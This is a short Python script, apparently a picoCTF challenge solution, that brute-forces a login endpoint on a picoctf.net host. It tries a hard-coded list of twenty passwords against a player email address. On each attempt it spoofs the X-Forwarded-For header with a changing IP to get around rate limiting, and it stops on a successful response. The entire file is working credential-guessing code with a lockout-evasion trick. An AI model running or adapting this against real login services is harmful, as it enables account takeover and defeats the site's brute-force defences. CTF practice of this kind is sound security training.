import requests

url = "http://amiable-citadel.picoctf.net:50813/login"

passwords = [
"JiywhfQn",
"3zSd0XU0",
"50ylF3Uo",
"7XbIBfcQ",
"W4K0inBD",
"pSvOYV4a",
"MpNXnpfS",
"ZuylCpyS",
"bgl0SpNj",
"h2qf8Ppg",
"maSXnInx",
"iiidp7qG",
"enyDlwq8",
"P5gRbs2V",
"YrWWubgE",
"Gq7ZVFuD",
"Xpseyq9h",
"lVY5T9Ah",
"URgET2ph",
"6epBnWRf"
]

for i, pw in enumerate(passwords):
    headers = {
        "X-Forwarded-For": f"1.1.1.{i}"
    }

    data = {
        "email": "ctf-player@picoctf.org",
        "password": pw
    }

    r = requests.post(url, headers=headers, json=data)

    print(f"Trying: {pw} -> {r.text}")

    if "true" in r.text:
        print("\n🔥 SUCCESS:", pw)
        break
